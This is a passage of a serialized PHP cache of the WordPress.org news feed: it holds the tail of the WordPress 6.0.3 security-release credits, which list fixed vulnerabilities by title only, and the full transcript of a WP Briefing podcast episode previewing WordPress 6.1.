Alex Concha and Ben Bidner from the WordPress security team</li>\n\n\n\n<li>Stored XSS in WordPress Core via Comment Editing &#8211; Third-party security audit and Alex Concha from the WordPress security team</li>\n\n\n\n<li>Data exposure via the REST Terms/Tags Endpoint &#8211; Than Taintor</li>\n\n\n\n<li>Content from multipart emails leaked &#8211; <a href=\"https://profiles.wordpress.org/kraftner\">Thomas Kräftner</a></li>\n\n\n\n<li>SQL Injection due to improper sanitization in `WP_Date_Query` &#8211; <a href=\"https://www.gold-network.ch\">Michael Mazzolini</a></li>\n\n\n\n<li>RSS Widget: Stored XSS issue &#8211; Third-party security audit</li>\n\n\n\n<li>Stored XSS in the search block &#8211; Alex Concha of the WP Security team</li>\n\n\n\n<li>Feature Image Block: XSS issue &#8211; Third-party security audit</li>\n\n\n\n<li>RSS Block: Stored XSS issue &#8211; Third-party security audit</li>\n\n\n\n<li>Fix widget block XSS &#8211; Third-party security audit</li>\n</ul>\n\n\n\n<h2>Thank you to these WordPress contributors</h2>\n\n\n\n<p>This release was led by <a href=\"https://profiles.wordpress.org/xknown\">Alex Concha</a>, <a href=\"https://profiles.wordpress.org/peterwilsoncc\">Peter Wilson</a>, <a href=\"https://profiles.wordpress.org/audrasjb\">Jb Audras</a>, and <a href=\"https://profiles.wordpress.org/SergeyBiryukov\">Sergey Biryukov</a> at mission control. Thanks to <a href=\"https://profiles.wordpress.org/desrosj/\">Jonathan Desrosiers</a>, <a href=\"https://profiles.wordpress.org/jorgefilipecosta/\">Jorge Costa</a>, <a href=\"https://profiles.wordpress.org/bernhard-reiter/\">Bernie Reiter</a> and <a href=\"https://profiles.wordpress.org/cbravobernal/\">Carlos Bravo</a> for their help on package updates.</p>\n\n\n\n<p>WordPress 6.0.3 would not have been possible without the contributions of the following people. Their asynchronous coordination to deliver several fixes into a stable release is a testament to the power and capability of the WordPress community.</p>\n\n\n\n<p class=\"is-style-default\"><a href=\"https://profiles.wordpress.org/xknown/\">Alex Concha</a>, <a href=\"https://profiles.wordpress.org/costdev/\">Colin Stewart</a>, <a href=\"https://profiles.wordpress.org/talldanwp/\">Daniel Richards</a>, <a href=\"https://profiles.wordpress.org/davidbaumwald/\">David Baumwald</a>, <a href=\"https://profiles.wordpress.org/dd32/\">Dion Hulse</a>, <a href=\"https://profiles.wordpress.org/ehtis/\">ehtis</a>, <a href=\"https://profiles.wordpress.org/voldemortensen/\">Garth Mortensen</a>, <a href=\"https://profiles.wordpress.org/audrasjb/\">Jb Audras</a>, <a href=\"https://profiles.wordpress.org/johnbillion/\">John Blackbourn</a>, <a href=\"https://profiles.wordpress.org/johnjamesjacoby/\">John James Jacoby</a>, <a href=\"https://profiles.wordpress.org/desrosj/\">Jonathan Desrosiers</a>, <a href=\"https://profiles.wordpress.org/jorgefilipecosta/\">Jorge Costa</a>, <a href=\"https://profiles.wordpress.org/jrf/\">Juliette Reinders Folmer</a>, <a href=\"https://profiles.wordpress.org/rudlinkon/\">Linkon Miyan</a>, <a href=\"https://profiles.wordpress.org/martinkrcho/\">martin.krcho</a>, <a href=\"https://profiles.wordpress.org/matveb/\">Matias Ventura</a>, <a href=\"https://profiles.wordpress.org/mukesh27/\">Mukesh Panchal</a>, <a href=\"https://profiles.wordpress.org/paulkevan/\">Paul Kevan</a>, <a href=\"https://profiles.wordpress.org/peterwilsoncc/\">Peter Wilson</a>, <a href=\"https://profiles.wordpress.org/noisysocks/\">Robert Anderson</a><a href=\"https://profiles.wordpress.org/robinwpdeveloper/\">Robin</a>, <a href=\"https://profiles.wordpress.org/sergeybiryukov/\">Sergey Biryukov</a>, <a href=\"https://profiles.wordpress.org/sumitbagthariya16/\">Sumit Bagthariya</a>, <a href=\"https://profiles.wordpress.org/tykoted/\">Teddy Patriarca</a>, <a href=\"https://profiles.wordpress.org/timothyblynjacobs/\">Timothy Jacobs</a>, <a href=\"https://profiles.wordpress.org/vortfu/\">vortfu</a>, and <a href=\"https://profiles.wordpress.org/chesio/\">Česlav Przywara</a>.</p>\n\n\n\n<p class=\"has-text-align-right has-small-font-size\"><em>Thanks to <a href=\'https://profiles.wordpress.org/peterwilsoncc/\' class=\'mention\'><span class=\'mentions-prefix\'>@</span>peterwilsoncc</a> for proofreading.</em></p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13618\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:3;a:6:{s:4:\"data\";s:61:\"\n		\n		\n		\n		\n		\n				\n		\n		\n\n					\n										\n					\n		\n		\n\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:7:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:79:\"WP Briefing: Episode 41: WordPress 6.1 Sneak Peek with Special Guest Nick Diego\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:101:\"https://wordpress.org/news/2022/10/episode-41-wordpress-6-1-sneak-peek-with-special-guest-nick-diego/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Mon, 17 Oct 2022 12:00:00 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:2:{i:0;a:5:{s:4:\"data\";s:7:\"Podcast\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:11:\"wp-briefing\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:53:\"https://wordpress.org/news/?post_type=podcast&p=13578\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:112:\"Tune into episode 41 of the WordPress Briefing Podcast for a sneak peek into the upcoming WordPress 6.1 release.\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:9:\"enclosure\";a:1:{i:0;a:5:{s:4:\"data\";s:0:\"\";s:7:\"attribs\";a:1:{s:0:\"\";a:3:{s:3:\"url\";s:60:\"https://wordpress.org/news/files/2022/10/WP-Briefing-041.mp3\";s:6:\"length\";s:1:\"0\";s:4:\"type\";s:0:\"\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:14:\"Santana Inniss\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:24900:\"\n<p>In the forty-first episode of the WordPress Briefing, peek into the upcoming WordPress 6.1 release with our host, Josepha Haden Chomphosy, and the release&#8217;s Editor Triage Lead, Nick Diego. </p>\n\n\n\n<p><em><strong>Have a question you&#8217;d like answered? You can submit them to <a href=\"mailto:wpbriefing@wordpress.org\">wpbriefing@wordpress.org</a>, either written or as a voice recording.</strong></em></p>\n\n\n\n<h2>Credits</h2>\n\n\n\n<p>Editor:&nbsp;<a href=\"https://profiles.wordpress.org/dustinhartzler/\">Dustin Hartzler</a><br>Logo:&nbsp;<a href=\"https://profiles.wordpress.org/javiarce/\" data-type=\"URL\" data-id=\"https://profiles.wordpress.org/javiarce/\">Javier Arce</a><br>Production:&nbsp;<a href=\"https://profiles.wordpress.org/santanainniss/\">Santana Inniss</a><br>Song: Fearless First by Kevin MacLeod </p>\n\n\n\n<h2>Guests</h2>\n\n\n\n<p><a href=\"https://profiles.wordpress.org/ndiego/\" data-type=\"URL\" data-id=\"https://profiles.wordpress.org/ndiego/\">Nick Diego</a></p>\n\n\n\n<h2>References</h2>\n\n\n\n<p><a href=\"https://make.wordpress.org/mobile/2022/10/04/call-for-testing-wordpress-for-android-20-9/\" data-type=\"URL\" data-id=\"https://make.wordpress.org/mobile/2022/10/04/call-for-testing-wordpress-for-android-20-9/\">Call for Testing for WordPress for Android 20.9</a><br><a href=\"https://wordpress.org/news/2022/10/wordpress-6-1-release-candidate-2-now-available/\" data-type=\"URL\" data-id=\"https://wordpress.org/news/2022/10/wordpress-6-1-release-candidate-2-now-available/\">RC2 WordPress 6.1</a> <br><a href=\"https://make.wordpress.org/core/2022/10/10/multisite-improvements-in-wordpress-6-1/\" data-type=\"URL\" data-id=\"https://make.wordpress.org/core/2022/10/10/multisite-improvements-in-wordpress-6-1/\">Multisite Improvements</a><br><a href=\"https://make.wordpress.org/core/2022/10/10/block-styles-generation-style-engine/\" data-type=\"URL\" data-id=\"https://make.wordpress.org/core/2022/10/10/block-styles-generation-style-engine/\">Block Style Generation Tool</a><br><a href=\"https://make.wordpress.org/core/2022/10/10/changes-to-block-editor-preferences-in-wordpress-6-1/\" data-type=\"URL\" data-id=\"https://make.wordpress.org/core/2022/10/10/changes-to-block-editor-preferences-in-wordpress-6-1/\">Editor Preferences Changes</a><br><a href=\"https://make.wordpress.org/core/2022/09/14/6-1-product-walk-through-recap/\" data-type=\"URL\" data-id=\"https://make.wordpress.org/core/2022/09/14/6-1-product-walk-through-recap/\">WordPress 6.1 Walkthrough </a></p>\n\n\n\n<h2>Transcript</h2>\n\n\n\n<span id=\"more-13578\"></span>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:00:00]&nbsp;</strong></p>\n\n\n\n<p>Hello everyone. And welcome to the WordPress Briefing, the podcast where you can catch quick explanations of the ideas behind the WordPress open source project, some insight into the community that supports it, and get a small list of big things coming up in the next two weeks.</p>\n\n\n\n<p>I&#8217;m your host, Josepha Haden Chomphosy. Here we go.&nbsp;</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:00:40]&nbsp;</strong></p>\n\n\n\n<p>And today I have with me Nick Diego. Welcome, Nick, to the WordPress Briefing.</p>\n\n\n\n<p><strong>[Nick Diego 00:00:44]&nbsp;</strong></p>\n\n\n\n<p>Thank you so much for having me.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:00:46]&nbsp;</strong></p>\n\n\n\n<p>Yeah. Before we get started, why don&#8217;t you tell me a bit about yourself, just kind of your history with WordPress and then what it is that you&#8217;ve been doing with the WordPress 6.1 release squad.</p>\n\n\n\n<p><strong>[Nick Diego 00:00:56]</strong></p>\n\n\n\n<p>Yeah, so I&#8217;m actually kind of new to working with WordPress full-time. Up until about June of last year, I was in the hospitality industry for a career of 10 years. But I always loved doing WordPress on the side. And after the long pandemic, I figured it was time to kind of pursue my passion and work with WordPress full-time.</p>\n\n\n\n<p>And that ultimately led to my current role as a developer advocate at WPEngine, where I focus primarily on WordPress and contribution to Core itself. And then I guess it was maybe March or April this year when <a href=\"https://profiles.wordpress.org/annezazu/\">Anne McCarthy</a>, who I&#8217;ve worked with a ton, she asked me if I&#8217;d be interested in helping out on 6.0 as an Editor Triage Lead which was an awesome experience.</p>\n\n\n\n<p>And now I&#8217;m back for 6.1.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:01:37]&nbsp;</strong></p>\n\n\n\n<p>That&#8217;s excellent. I always like to hear about people who are coming to do repeat tours of duty.</p>\n\n\n\n<p><strong>[Nick Diego 00:01:43]</strong></p>\n\n\n\n<p>Yes, exactly.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:01:44]&nbsp;</strong></p>\n\n\n\n<p>I probably shouldn&#8217;t refer to working on WordPress releases as a tour of duty. However, I find that releases are so large and complex, and there are so many people in there now that working on them takes an entirely different skill set now than it used to take when WordPress was like 1% of the web.</p>\n\n\n\n<p>And so I think it&#8217;s a really big task, and I think it&#8217;s great when people were, like, that was either so good that I would do it again, or I would like a second go because I could do it better. Whichever way brings people to it. So, yeah.</p>\n\n\n\n<p><strong>[Nick Diego 00:02:18]&nbsp;</strong></p>\n\n\n\n<p>No, I was just gonna say that&#8217;s a great point because the Editor Triage Lead, which is the role that I currently have, was a brand new role for 6.0. The project kind of got so big that it kind of made sense to have a triage lead focused specifically on Gutenberg. Gutenberg&#8217;s such a big part of WordPress now.</p>\n\n\n\n<p>And so that&#8217;s where that role kind of came from, and now we&#8217;ve carried it over to 6.1. As the project grows, we need more people to come in and help make sure the release is as smooth as it can be.&nbsp;</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:02:42]</strong></p>\n\n\n\n<p>Yes. Because of that promise of backward compatibility and all the things.</p>\n\n\n\n<p><strong>[Nick Diego 00:02:47]</strong></p>\n\n\n\n<p>Exactly.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:02:48]&nbsp;</strong></p>\n\n\n\n<p>Cool. So, by the time this releases, if I recall correctly, we will have passed RC2, or RC2 is coming the next day or something like that. We&#8217;re right around the Release Candidate two. So you have been doing this for quite some time on this particular release. So far, what is the feature that you&#8217;re most excited about that&#8217;s going out in the 6.1 release?</p>\n\n\n\n<p><strong>[Nick Diego 00:03:09]&nbsp;</strong></p>\n\n\n\n<p>So, this is going to sound really boring, but it&#8217;s actually incredibly exciting. So, the most exciting quote-unquote feature that I&#8217;m excited about is the improved consistency and standardization of block controls that are coming in 6.1. So things like typography and color and borders and dimensions.</p>\n\n\n\n<p>These are things and tools that we&#8217;ve had in a lot of core blocks, but it hasn&#8217;t been consistent throughout. And a ton of work has been done in 6.1 to establish that consistency. We&#8217;re not a hundred percent there, but typography, I think we&#8217;re at like 85% of all core blocks now support all the typography controls, and with each release as we head to 6.2, we&#8217;ll improve on that.</p>\n\n\n\n<p>But it&#8217;s really great for theme builders, theme designers, and users to be able to control the look and feel blocks consistently throughout the editor.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:03:58]&nbsp;</strong></p>\n\n\n\n<p>I was gonna immediately answer you earlier with like, there are no boring answers, there are no boring improvements. And as you were explaining why it is that you kind of thought it might be considered boring, I think it&#8217;s fair to say that anytime that you&#8217;re increasing the consistency and you&#8217;re increasing the confidence between what you saw on the back end and what you actually shipped on the front end– anytime you&#8217;re doing that, I think that that is exciting in the prove the negative way.&nbsp;</p>\n\n\n\n<p>If you think about the negative excitement that occurs when you have published something, and it looks one way in the back end, and then it looks totally different on the front end, and the panic you feel when you have to fix. Not having that is a really big step up, I think. And so anything that provides more consistency for people who are using WordPress, people who are building with WordPress, I always find exciting. But also, like, I&#8217;m an office person, and so I would find office things exciting, right?</p>\n\n\n\n<p><strong>[Nick Diego 00:04:53]&nbsp;</strong></p>\n\n\n\n<p>It creates a more delightful experience. I do a lot of work on the Training team, doing educational things, and we teach people how to change typography and change color. Once they learn how to do it in one block, if they can take that same skill set and apply it to any other block, it&#8217;s that light bulb moment. They understand they know how to manipulate and use WordPress to its fullest. So adding that consistency really helps to level up users.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:05:15]&nbsp;</strong></p>\n\n\n\n<p>Yeah, I&#8217;m gonna take us off track a little bit and just ask a general question here. Like, I remember the first time that I was working with what was a site, I guess, qualified for a site at the time. And I remember the first time that I discovered that I could change the look and feel with HTML and CSS, and I did that.</p>\n\n\n\n<p>Also was like, well, I accept my fate. Whatever happens, if I kill everything I&#8217;ve ever written, that is just how it&#8217;ll be. Like the sheer terror of all of that is so different now. Do you recall that first moment where you&#8217;re like, Oh, I do have some power over this? I have some control over this, and whether you also found it scary.</p>\n\n\n\n<p><strong>[Nick Diego 00:05:52]</strong></p>\n\n\n\n<p>So I came to WordPress kinda as a hobby and website development kind of as a hobby. So I was kind of always in that tinkering phase, or I wasn&#8217;t building something for anyone else. I was in a safe place to destroy whatever I was working on with my tinkering. So I never really quite had that fear, but I can definitely see it from the perspective of building something for somebody else.</p>\n\n\n\n<p>But you&#8217;re right, the editor and the controls that we have, and you know, now make it a lot easier to kind of manipulate and exert your creative desires in WordPress than it was before with CSS.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:06:23]&nbsp;</strong></p>\n\n\n\n<p>I love the phrase ‘I was safe to destroy things, ’ and if I can figure out a way to make it a tagline for something, I will.</p>\n\n\n\n<p><strong>[Nick Diego 00:06:30]&nbsp;</strong></p>\n\n\n\n<p>Exactly.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:06:31]&nbsp;</strong></p>\n\n\n\n<p>Alright. So during your second time around here on the release squad with 6.1, what have been the bright spots of that experience, and have there been any unexpected challenges of being on the release squad?</p>\n\n\n\n<p><strong>[Nick Diego 00:06:44]</strong></p>\n\n\n\n<p>Again, I come to WordPress from, you know, from a different career. It&#8217;s kind of a passion of mine to be working with WordPress. So I kinda have a unique experience than maybe some others. And when I approach WordPress, there&#8217;s always that tendency to say, ‘why doesn&#8217;t it do this?’ Or ‘why don&#8217;t they do this?’ And I&#8217;ve always been the person…, well, it&#8217;s open source. We, we, we can, we can</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:07:05]&nbsp;</strong></p>\n\n\n\n<p>…can do it</p>\n\n\n\n<p><strong>[Nick Diego 00:07:05]&nbsp;</strong></p>\n\n\n\n<p>…we can do it. And so that&#8217;s kind of how I approach things. Now, of course, you know, I have the privilege of time to do that. Not everybody does, but one of the unexpected bright spots about working in a release squad is understanding how it all works.&nbsp;</p>\n\n\n\n<p>How does WordPress actually get built? What is the process that it goes through? It was just eye-opening to me, and I really got a shout-out, Anne, for inviting me to be on 6.0. It brought me in. I learned so much about it, and now I&#8217;m just excited to keep working on these releases.</p>\n\n\n\n<p>But a release is hard. You know, it&#8217;s a… WordPress is huge. There are a lot of moving parts, there are a lot of things going on. Right now, we&#8217;re trying to get everything ready for the first release candidate. So being on the release squad is not an easy job. But it&#8217;s exciting, it&#8217;s fun, and you really feel like you&#8217;re part of that ‘we’ really helping to build WordPress.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:07:53]&nbsp;</strong></p>\n\n\n\n<p>One of the things that I hope that people have learned from any time that they spent working with me is that like we understand here in the WordPress open source project, and I believe that all open source projects must understand this, but like every change that you make, if there are things that are dependent on it, which is gonna be true for most of us, we&#8217;ll have intended consequences and also unexpected consequences, and unintended, unexpected consequences.&nbsp;</p>\n\n\n\n<p>And so I&#8217;ve always felt like the thing that really makes the biggest difference about how we do open source in WordPress is that, for the most part, we have a concept of where the most likely changes are going to happen across our entire ecosystem.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:08:40]&nbsp;</strong></p>\n\n\n\n<p>We have a better understanding, at least compared to when I got here, a better understanding of how interconnected it all is. And so you&#8217;ve got this change here, and it looks small, but it&#8217;s gonna have this positive or negative impact as you kind of work your way out from it. And so I think that that is an interesting thing, and certainly, you get a really clear concept of it in the release squad, I think.</p>\n\n\n\n<p><strong>[Nick Diego 00:09:02]</strong></p>\n\n\n\n<p>Oh, absolutely. If you were to build something like the block editor without caring at all about backward compatibility, you&#8217;d be done by now, right? I mean, so much of what we do is concerning ourselves with making sure that everybody who&#8217;s on a classic theme or hybrid theme or whatever it might be that they continue to use WordPress in a safe and stable way.</p>\n\n\n\n<p>This is part of being such a large content management system.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:09:24]&nbsp;</strong></p>\n\n\n\n<p>So you already told us the feature that you&#8217;re most excited about, and so now I&#8217;m gonna ask you about what feature or what bug fix has the most notable improvements that are coming to 6.1. This is a little different as in, like, there&#8217;s the thing you&#8217;re excited about, which is an office thing, but like a thing that is maybe not new but has the biggest delta, the biggest change to anyone&#8217;s experience of it.</p>\n\n\n\n<p><strong>[Nick Diego 00:09:51]&nbsp;</strong></p>\n\n\n\n<p>Yeah, so obviously, in 5.9, we introduced full site editing, and 6.0 was a natural progression from that with more and more features. Now it&#8217;s safe to say that there&#8217;s only a small fraction of websites that are using the whole full site editing of or block themes, all that kind of stuff. One of the hangups about that was managing templates inside of the site editor.</p>\n\n\n\n<p>You could add the files to your theme, which would then show up in the site editor. But there wasn&#8217;t a direct way to add more complicated templates within the site editor itself. That is changing in 6.1. So now you actually have the functionality to install something like 2023, which is the new core theme, and build out all these very complicated templates within the UI of the site editor that you could not have done before.</p>\n\n\n\n<p><strong>[Nick Diego 00:10:38]</strong>&nbsp;</p>\n\n\n\n<p>I personally think that the biggest benefit of full site editing is really to empower no-code or low-code users. And the ability to add these templates directly in the UI really levels them up. Because now, you can do all that complicated stuff that you normally would need to be adding to theme files and jumping into the code. You can do that within the site editor now, which I think is fantastic.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:10:59]&nbsp;</strong></p>\n\n\n\n<p>That&#8217;s great. And just a general caveat, anytime that we talk about anything that&#8217;s very developer-y or very no code-y, I think it&#8217;s always worth mentioning, yes, a lot of what we&#8217;re trying to do with the block editor is to just kind of give some power back to folks who cannot find the time to become a developer or don&#8217;t have the inclination. They don&#8217;t want to do that.&nbsp;</p>\n\n\n\n<p>But that does not mean that no code is ever involved in WordPress. It&#8217;s still a software. You can still do very complicated things with it. And if you are a developer, you should not think to yourself, ‘oh now that it&#8217;s being available to low code/no code users, that means you don&#8217;t want me.’</p>\n\n\n\n<p>Like, that&#8217;s not at all what&#8217;s happening. You can do very complicated things still.&nbsp;</p>\n\n\n\n<p><strong>[Nick Diego 00:11:42]&nbsp;</strong></p>\n\n\n\n<p>A hundred percent. A hundred percent. Absolutely.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:11:45]&nbsp;</strong></p>\n\n\n\n<p>Alright, so that brings us to our final question here because we like to stay as true to the name as possible here on the WP Briefing. If someone were wanting to get involved with the next release, so WP 6.2, how would they do that?</p>\n\n\n\n<p><strong>[Nick Diego 00:12:01]</strong></p>\n\n\n\n<p>So, talk to Anne, and she&#8217;ll get you set up. No, I&#8217;m just kidding. So at the, after each release, there&#8217;s a posting that goes out that lists all the different release teams, and you can just put your name out there and ask to be, you know, for consideration to be part of the team.</p>\n\n\n\n<p>However, I will say that the best thing you can do right now is help with 6.1. You don&#8217;t necessarily need to be a release lead to do that testing, helping with bug fixes. Reach out to me. Reach out to other release leads, and we&#8217;ll get you involved and engaged with the release. That will give you a really good framework to start working and become a release lead for 6.2.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:12:37]&nbsp;</strong></p>\n\n\n\n<p>Yeah. I think we talked maybe two or three episodes ago, or it could be more than that, I&#8217;ll never know, about the release squad, like the group that&#8217;s doing that. In the event you think to yourself, ‘there&#8217;s no way in a million years that I&#8217;m gonna just show up tomorrow and be part of the release squad,’ I heard what they said in the first question/answer moment– that&#8217;s fine, too.&nbsp;</p>\n\n\n\n<p>As Nick mentioned, you can always get involved with testing, you can get involved with triage. Those are areas where any feedback at all is valuable because we can get better information about what worked and didn&#8217;t, what was expected versus what happened. And that type of information is where all of our co-creators of the WordPress software–really, we rely on what you all are pointing out to us.&nbsp;</p>\n\n\n\n<p>If you&#8217;re not shining spotlights on the most painful parts of your experience, sometimes we don&#8217;t necessarily know that that&#8217;s a pain point for anyone.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:13:34]</strong>&nbsp;</p>\n\n\n\n<p>And so yeah, that&#8217;s a great place to start. If you are more of a writer, technical or prose, there are different spaces you can go to, like keep our docs up to date or make sure that people know that changes are coming at all in WordPress because that&#8217;s a thing. If you are a backend developer, we have a million things you can do because that&#8217;s just all day, every day, for WordPress.</p>\n\n\n\n<p>It&#8217;s just all the deep backend work. And so yeah.</p>\n\n\n\n<p><strong>[Nick Diego 00:13:58]&nbsp;</strong></p>\n\n\n\n<p>I did want to mention that, you know, being on the release team does not necessarily mean that you&#8217;re incredibly technical. We have a documentation lead, we have a design lead, you know, a communication lead. So there&#8217;s a lot of different roles in the team that, you know, across all disciplines.</p>\n\n\n\n<p>So don&#8217;t think if you&#8217;re not a hardcore developer, that precludes you from being on the team.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:14:19]&nbsp;</strong></p>\n\n\n\n<p>Yeah, and if you&#8217;re really good with common sense and working fully remotely, you can be the release coordinator. I can tell you because I did that for 5.0. It was a big job. It was our, it was the first time we had a release squad as opposed to just like the release lead.</p>\n\n\n\n<p>Because there was just so much that was going into that and so much riding on it. And like you said in some other answer that you gave like if you were to just be like, we&#8217;re shutting everything down and rewriting this in six months, and I hope you can come with us on it. Like a lot of open source projects do it that way.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:14:51]</strong>&nbsp;</p>\n\n\n\n<p>And that is a choice, and we made the opposite choice. And so we&#8217;re bringing all of our co-conspirators with us, all of our co-creators of WordPress. That&#8217;s the hope all the time. Making sure that they have enough information, that they feel safe to destroy things, enough information, and skills about how to get out of it, that they always feel some high confidence in what they&#8217;re trying to do versus what they actually did do.</p>\n\n\n\n<p>So, yeah, excellent. Nick, do you have any final thoughts for our listeners?</p>\n\n\n\n<p><strong>[Nick Diego 00:15:20]&nbsp;</strong></p>\n\n\n\n<p>Nope. I just hope everybody goes out and downloads 6.1 and enjoys it as much as I am.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:15:25]&nbsp;</strong></p>\n\n\n\n<p>Yeah, go check it out.&nbsp;</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:15:28]&nbsp;</strong></p>\n\n\n\n<p>That brings us now to our small list of big things. And actually, it is a pretty big list today, but still pretty big things too. So first up, we have a call for testing that is out, and it is for our Android users.</p>\n\n\n\n<p>There is a call for testing for WordPress for Android 20.9, and I feel like we don&#8217;t get a lot of calls for testing for Android devices. And so if you have been feeling left out or just like we don&#8217;t always have that kind of mobile testing available, this is the opportunity for you.&nbsp;</p>\n\n\n\n<p>The next thing is that tomorrow, we have RC2, release candidate two for WordPress 6.1.</p>\n\n\n\n<p>That&#8217;s coming out on October 18th. There will be a link in the show notes, but that means if you write a plugin or a theme or have anything that kind of extends the core of WordPress, now is the time to start testing anything that might be a bug or represent a breaking change and make sure that you file those bugs so that we can get things as settled and excellent as possible.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:16:40]&nbsp;</strong></p>\n\n\n\n<p>And speaking of Word points, uh, WordPress 6.1, not Word point, WordPress 6.1. I actually have three changes that I think are going to represent some pretty big changes for folks. I will have links to all of these in the show notes. If you don&#8217;t know where the show notes are, it&#8217;s on wordpress.org/news/podcast.</p>\n\n\n\n<p>So the three things that I think are gonna be big, worthwhile things. The first one is multisite improvements, and the second one will be the style engine that&#8217;s block styles generation tool, which will ship in Core and I think is really important for y&#8217;all to take a look at. And then also there are some changes coming to the block editor preferences.<br><br>Like I said, links to all of those are going to be in the show notes, and so they should be pretty easy for you to find. But also, if you want to just get a general look at everything that&#8217;s coming in 6.1, we did a walkthrough that I will link to in the show notes as well, and you can get a full understanding of what is going to be coming early in November.</p>\n\n\n\n<p><strong>[Josepha Haden Chomphosy 00:17:45]&nbsp;</strong></p>\n\n\n\n<p>And that, my friends, is your small list –big list– of big things. Thanks for tuning in today for the WordPress Briefing. I&#8217;m your host, Josepha Haden Chomphosy, and I&#8217;ll see you again in a couple of weeks.</p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13578\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:4;a:6:{s:4:\"data\";s:61:\"\n		\n		\n		\n		\n		\n				\n		\n		\n\n					\n										\n					\n		\n		\n\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:7:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:41:\"The Month in WordPress – September 2022\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:73:\"https://wordpress.org/news/2022/10/the-month-in-wordpress-september-2022/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Fri, 14 Oct 2022 